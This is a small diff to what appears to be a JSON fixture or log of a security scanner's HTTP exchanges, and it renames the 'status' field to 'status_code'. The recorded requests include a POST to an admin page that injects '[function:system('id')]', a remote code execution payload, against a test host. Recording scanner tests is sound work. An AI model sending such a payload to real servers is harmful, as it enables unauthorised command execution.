@@ -203,7 +203,7 @@
           "raw": "POST /admin.php?mode=edit&id=42 HTTP/1.1\r\nHost: target.example.test\r\nUser-Agent: vibe-csa/3.0\r\nAccept: */*\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=<redacted-session-cookie>\r\n\r\ntitle=vibe-csa-test-rce&content_functions=1&content=%5Bfunction%3Asystem%28%27id%27%29%5D&save=1"
         },
         "response": {
-          "status": 302,
+          "status_code": 302,
           "headers": {
             "Location": "/page/test-rce",
             "Content-Type": "text/html; charset=UTF-8",
@@ -238,7 +238,7 @@
           "raw": "GET /page/test-rce HTTP/1.1\r\nHost: target.example.test\r\nUser-Agent: vibe-csa/3.0\r\nAccept: */*\r\n\r\n"
         },
         "response": {
-          "status": 200,
+          "status_code": 200,
           "headers": {
             "Content-Type": "text/html; charset=UTF-8",
             "Content-Length": "187"
